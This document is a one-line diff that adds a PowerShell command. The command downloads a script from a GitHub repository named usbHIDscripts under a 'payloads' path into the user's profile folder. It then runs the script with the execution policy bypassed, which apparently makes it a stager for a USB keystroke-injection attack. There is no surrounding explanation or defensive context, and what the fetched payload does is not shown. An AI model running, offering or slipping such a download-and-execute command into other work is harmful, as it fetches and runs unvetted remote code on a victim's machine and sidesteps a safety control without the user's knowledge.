@@ -1,0 +1,1 @@
+powershell.exe -NoProfile -Command "$p = Join-Path $env:USERPROFILE 'execute.ps1'; curl.exe 'https://raw.githubusercontent.com/e30301/usbHIDscripts/refs/heads/main/payloads/execute.ps1' -o $p; powershell.exe -ExecutionPolicy Bypass -File $p"
